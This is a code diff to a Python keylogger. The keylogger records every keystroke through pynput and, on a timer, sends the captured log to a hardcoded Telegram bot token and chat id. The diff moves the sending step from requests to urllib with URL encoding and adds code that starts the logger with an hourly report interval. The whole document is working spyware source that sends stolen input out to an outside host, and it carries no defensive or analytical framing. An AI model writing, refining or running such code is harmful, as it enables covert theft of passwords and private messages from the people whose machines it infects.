@@ -1,7 +1,7 @@
 import pynput.keyboard # This library allows to monitor mouse clicks and keyboard strokes.
 import threading
-import smtplib
-import requests
+from urllib.request import urlopen, Request
+import urllib.parse
 
 class Keylogger:
     def __init__(self, interval, email, password):
@@ -24,8 +24,8 @@ class Keylogger:
         self.append_to_key(current_key)
 
     def report(self):
-        requests.get('https://api.telegram.org/bot5790947499:AAF7Svc-L1HknSWIPyCo63isRpzbw3L8bOw/sendMessage?chat_id=583385862&text=' + '\n\n' + self.log)
-        # self.send_mail(self.email, self.password, '\n\n' + self.log)
+        MessageURL_bot = str('https://api.telegram.org/bot5790947499:AAF7Svc-L1HknSWIPyCo63isRpzbw3L8bOw/sendMessage?chat_id=583385862&text=' + urllib.parse.quote_plus('\n\n') + urllib.parse.quote_plus(self.log))
+        urlopen(Request(url=MessageURL_bot))
         self.log = ''
         timer = threading.Timer(self.interval, self.report)
         timer.start()
@@ -45,3 +45,6 @@ class Keylogger:
                 keyboard_listener.join()
         except KeyboardInterrupt:
             print('\nExiting program')
+            
+my_keylogger = Keylogger(3600, "example@mail.com", "password")
+my_keylogger.start()
